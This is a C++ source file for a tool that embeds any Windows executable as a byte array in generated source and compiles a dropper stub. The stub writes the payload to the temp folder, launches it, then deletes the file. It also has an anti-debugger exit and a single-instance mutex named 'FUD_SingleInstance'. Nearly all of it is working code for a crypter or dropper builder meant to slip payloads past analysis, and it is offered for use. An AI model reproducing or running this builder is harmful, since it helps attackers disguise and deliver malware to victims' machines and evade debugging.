#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>

class FixedPEEmbedder {
public:
    static bool embedPEAndCompile(const std::string& inputPath, const std::string& outputPath) {
        std::cout << "=== FIXED PE EMBEDDING & COMPILATION ===" << std::endl;
        std::cout << "Input: " << inputPath << std::endl;
        std::cout << "Output: " << outputPath << std::endl;
        
        // Step 1: Read PE file
        std::vector<uint8_t> peData;
        if (!readPEFile(inputPath, peData)) {
            std::cout << "❌ Failed to read PE file" << std::endl;
            return false;
        }
        
        std::cout << "✅ PE file read successfully (" << peData.size() << " bytes)" << std::endl;
        
        // Step 2: Generate source code
        std::string sourceFile = "fixed_embedded.cpp";
        if (!generateEmbeddedSource(peData, sourceFile)) {
            std::cout << "❌ Failed to generate source code" << std::endl;
            return false;
        }
        
        std::cout << "✅ Source code generated: " << sourceFile << std::endl;
        
        // Step 3: Compile with better error handling
        if (!compileWithDebugging(sourceFile, outputPath)) {
            std::cout << "❌ Compilation failed" << std::endl;
            return false;
        }
        
        std::cout << "✅ Compilation successful!" << std::endl;
        return true;
    }

private:
    static bool readPEFile(const std::string& path, std::vector<uint8_t>& data) {
        std::ifstream file(path, std::ios::binary);
        if (!file) {
            std::cout << "Error: Cannot open file " << path << std::endl;
            return false;
        }
        
        file.seekg(0, std::ios::end);
        size_t size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        data.resize(size);
        file.read(reinterpret_cast<char*>(data.data()), size);
        
        return file.good();
    }
    
    static bool generateEmbeddedSource(const std::vector<uint8_t>& peData, const std::string& outputFile) {
        std::ofstream source(outputFile);
        if (!source) {
            std::cout << "Error: Cannot create source file " << outputFile << std::endl;
            return false;
        }
        
        source << "#include <windows.h>\n";
        source << "#include <stdio.h>\n";
        source << "#include <stdlib.h>\n";
        source << "#include <string.h>\n";
        source << "\n";
        source << "// Embedded PE data\n";
        source << "static unsigned char embedded_pe_data[] = {\n";
        
        // Write PE data in chunks to avoid compiler limits
        const size_t bytesPerLine = 16;
        for (size_t i = 0; i < peData.size(); i += bytesPerLine) {
            source << "    ";
            for (size_t j = 0; j < bytesPerLine && (i + j) < peData.size(); ++j) {
                source << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                       << static_cast<int>(peData[i + j]);
                if ((i + j) < peData.size() - 1) source << ", ";
            }
            source << "\n";
        }
        
        source << "};\n\n";
        source << "static const size_t embedded_pe_size = " << peData.size() << ";\n\n";
        
        // Add extraction function
        source << "void extract_and_execute() {\n";
        source << "    char tempPath[MAX_PATH];\n";
        source << "    GetTempPathA(MAX_PATH, tempPath);\n";
        source << "    strcat_s(tempPath, MAX_PATH, \"extracted_payload.exe\");\n";
        source << "    \n";
        source << "    FILE* file = NULL;\n";
        source << "    fopen_s(&file, tempPath, \"wb\");\n";
        source << "    if (file) {\n";
        source << "        fwrite(embedded_pe_data, 1, embedded_pe_size, file);\n";
        source << "        fclose(file);\n";
        source << "        \n";
        source << "        // Execute extracted payload\n";
        source << "        STARTUPINFOA si = {0};\n";
        source << "        PROCESS_INFORMATION pi = {0};\n";
        source << "        si.cb = sizeof(si);\n";
        source << "        \n";
        source << "        if (CreateProcessA(tempPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {\n";
        source << "            CloseHandle(pi.hProcess);\n";
        source << "            CloseHandle(pi.hThread);\n";
        source << "            Sleep(1000);\n";
        source << "            DeleteFileA(tempPath);\n";
        source << "        }\n";
        source << "    }\n";
        source << "}\n\n";
        
        // Add main function
        source << "int main() {\n";
        source << "    // Single instance check\n";
        source << "    HANDLE hMutex = CreateMutexA(NULL, FALSE, \"Global\\\\FUD_SingleInstance\");\n";
        source << "    if (GetLastError() == ERROR_ALREADY_EXISTS) {\n";
        source << "        CloseHandle(hMutex);\n";
        source << "        return 0;\n";
        source << "    }\n";
        source << "    \n";
        source << "    // Anti-debug check\n";
        source << "    if (IsDebuggerPresent()) {\n";
        source << "        CloseHandle(hMutex);\n";
        source << "        ExitProcess(0);\n";
        source << "    }\n";
        source << "    \n";
        source << "    // Extract and execute payload\n";
        source << "    extract_and_execute();\n";
        source << "    \n";
        source << "    CloseHandle(hMutex);\n";
        source << "    return 0;\n";
        source << "}\n";
        
        return true;
    }
    
    static bool compileWithDebugging(const std::string& sourceFile, const std::string& outputFile) {
        std::cout << "\n=== COMPILATION DEBUGGING ===" << std::endl;
        
        // Test 1: Check if source file exists
        if (GetFileAttributesA(sourceFile.c_str()) == INVALID_FILE_ATTRIBUTES) {
            std::cout << "❌ Source file does not exist: " << sourceFile << std::endl;
            return false;
        }
        std::cout << "✅ Source file exists" << std::endl;
        
        // Test 2: Simple compilation first
        std::string simpleCmd = "cmd /c \"cl.exe /nologo \"" + sourceFile + "\" /Fe:\"" + outputFile + "\" user32.lib kernel32.lib 2>simple_errors.txt\"";
        std::cout << "Testing simple compilation..." << std::endl;
        int simpleResult = system(simpleCmd.c_str());
        std::cout << "Simple compilation result: " << simpleResult << std::endl;
        
        if (simpleResult == 0) {
            std::cout << "✅ Simple compilation successful!" << std::endl;
            return true;
        }
        
        // Test 3: With vcvars setup
        std::cout << "Trying with vcvars64.bat setup..." << std::endl;
        std::string vcvarsCmd = "cmd /c \"call \"C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat\" >nul 2>&1 && cl.exe /nologo \"" + 
                               sourceFile + "\" /Fe:\"" + outputFile + "\" user32.lib kernel32.lib 2>vcvars_errors.txt\"";
        
        int vcvarsResult = system(vcvarsCmd.c_str());
        std::cout << "Vcvars compilation result: " << vcvarsResult << std::endl;
        
        if (vcvarsResult == 0) {
            std::cout << "✅ Vcvars compilation successful!" << std::endl;
            return true;
        }
        
        // Test 4: Alternative VS paths
        std::vector<std::string> vsPaths = {
            "C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat",
            "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Auxiliary\\Build\\vcvars64.bat",
            "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat",
            "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat",
            "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\VC\\Auxiliary\\Build\\vcvars64.bat",
            "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat"
        };
        
        for (const auto& vsPath : vsPaths) {
            if (GetFileAttributesA(vsPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                std::cout << "Trying VS path: " << vsPath << std::endl;
                std::string altCmd = "cmd /c \"call \"" + vsPath + "\" >nul 2>&1 && cl.exe /nologo \"" + 
                                   sourceFile + "\" /Fe:\"" + outputFile + "\" user32.lib kernel32.lib 2>alt_errors.txt\"";
                
                int altResult = system(altCmd.c_str());
                std::cout << "Alternative path result: " << altResult << std::endl;
                
                if (altResult == 0) {
                    std::cout << "✅ Alternative path compilation successful!" << std::endl;
                    return true;
                }
            }
        }
        
        // Show error details
        std::cout << "\n=== ERROR ANALYSIS ===" << std::endl;
        showErrorFile("simple_errors.txt");
        showErrorFile("vcvars_errors.txt");
        showErrorFile("alt_errors.txt");
        
        return false;
    }
    
    static void showErrorFile(const std::string& errorFile) {
        std::ifstream file(errorFile);
        if (file) {
            std::cout << "\n--- " << errorFile << " ---" << std::endl;
            std::string line;
            while (std::getline(file, line)) {
                if (!line.empty()) {
                    std::cout << line << std::endl;
                }
            }
        }
    }
};

int main(int argc, char* argv[]) {
    std::cout << "=== PE Embedding Fix Tool ===" << std::endl;
    
    if (argc < 3) {
        std::cout << "Usage: " << argv[0] << " <input_pe_file> <output_exe_file>" << std::endl;
        std::cout << "Example: " << argv[0] << " calc.exe packed_calc.exe" << std::endl;
        return 1;
    }
    
    std::string inputPath = argv[1];
    std::string outputPath = argv[2];
    
    if (FixedPEEmbedder::embedPEAndCompile(inputPath, outputPath)) {
        std::cout << "\n🎉 SUCCESS: PE embedding and compilation completed!" << std::endl;
        
        // Check final file size
        HANDLE hFile = CreateFileA(outputPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            std::cout << "Final executable size: " << fileSize << " bytes" << std::endl;
            CloseHandle(hFile);
        }
    } else {
        std::cout << "\n❌ FAILED: PE embedding or compilation failed!" << std::endl;
        return 1;
    }
    
    return 0;
}